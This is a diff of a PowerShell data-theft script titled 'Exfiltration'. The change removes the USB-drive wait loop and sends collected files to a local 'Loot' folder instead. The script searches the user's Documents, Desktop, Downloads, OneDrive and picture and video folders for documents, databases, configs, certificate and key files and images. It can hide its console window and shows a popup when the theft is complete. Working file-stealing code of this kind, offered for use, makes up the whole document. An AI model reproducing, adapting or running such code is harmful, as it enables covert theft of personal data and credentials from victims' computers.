@@ -3,47 +3,27 @@
 [Console]::Title = "Exfiltration"
 Clear-Host
 
-if($driveName.length -lt 1){
-    $driveName = Read-Host "Enter the name of the USB drive "
+# Skip USB detection, directly set destination to C: drive folder
+$destinationPath = "C:\ExfiltratedFiles\$env:COMPUTERNAME-Loot"
+
+if (-not (Test-Path -Path $destinationPath)) {
+    New-Item -ItemType Directory -Path $destinationPath -Force
+    Write-Host "New Folder Created: $destinationPath"  -ForegroundColor Green
 }
 
+# Set file extensions to search for
+$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
+$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")  
+
+# Remove the USB detection logic and directly set the folder path
+Write-Host "Loot Folder Set To: $destinationPath" -ForegroundColor Green
+
+# Check if the user wants to hide the window
 if($hidden.length -lt 1){
     $hidden = Read-Host "Would you like to hide this console window? (Y/N) "
 }
 
-$i = 10
-
-While ($true){
-    cls
-    Write-Host "Waiting for USB Drive.. ($i)" -ForegroundColor Yellow
-    $drive = Get-WMIObject Win32_LogicalDisk | ? {$_.VolumeName -eq $driveName} | select DeviceID
-    sleep 1
-    if ($drive.length -ne 0){
-        Write-Host "USB Drive Connected!" -ForegroundColor Green
-        break
-    }
-    $i--
-    if ($i -eq 0 ){
-        Write-Host "Timeout! Exiting" -ForegroundColor Red
-        sleep 1
-        exit
-    }
-}
-
-[Console]::SetWindowSize(80, 30)
-
-$drive = Get-WMIObject Win32_LogicalDisk | ? {$_.VolumeName -eq $driveName}
-$driveletter = $drive.DeviceID
-Write-Host "Loot Drive Set To : $driveLetter/" -ForegroundColor Green
-$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
-$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")  
-$destinationPath = "$driveLetter\$env:COMPUTERNAME-Loot"
-
-if (-not (Test-Path -Path $destinationPath)) {
-    New-Item -ItemType Directory -Path $destinationPath -Force
-    Write-Host "New Folder Created : $destinationPath"  -ForegroundColor Green
-}
-
+# Hide the console window if user selected 'Y'
 If ($hidden -eq 'y'){
     Write-Host "Hiding the Window.."  -ForegroundColor Red
     sleep 1
@@ -61,6 +41,7 @@ If ($hidden -eq 'y'){
     }
 }
 
+# Start searching for files in the specified folders
 foreach ($folder in $foldersToSearch) {
     Write-Host "Searching in $folder"  -ForegroundColor Yellow
     
@@ -74,6 +55,8 @@ foreach ($folder in $foldersToSearch) {
         }
     }
 }
+
+# Show completion message
 If ($hidden -eq 'y'){
     (New-Object -ComObject Wscript.Shell).Popup("File Exfiltration Complete",5,"Exfiltration",0x0)
 }
